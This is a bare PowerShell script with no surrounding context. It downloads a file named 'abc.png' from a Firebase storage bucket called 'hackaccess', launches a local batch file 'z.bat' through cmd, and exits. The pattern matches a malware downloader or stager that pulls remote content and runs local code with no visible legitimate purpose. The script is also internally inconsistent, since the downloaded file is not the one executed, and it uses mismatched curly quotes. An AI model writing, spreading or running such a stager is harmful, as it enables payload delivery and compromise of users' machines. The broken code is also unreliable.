$client = new-object System.Net.WebClient
$client.DownloadFile(“https://firebasestorage.googleapis.com/v0/b/hackaccess-4d765.appspot.com/o/abc.png?alt=media&token=eee61466-da20-4edf-9a2d-f8fc3237e9fb“, ".\abc.png”)
cmd /c ".\z.bat"
exit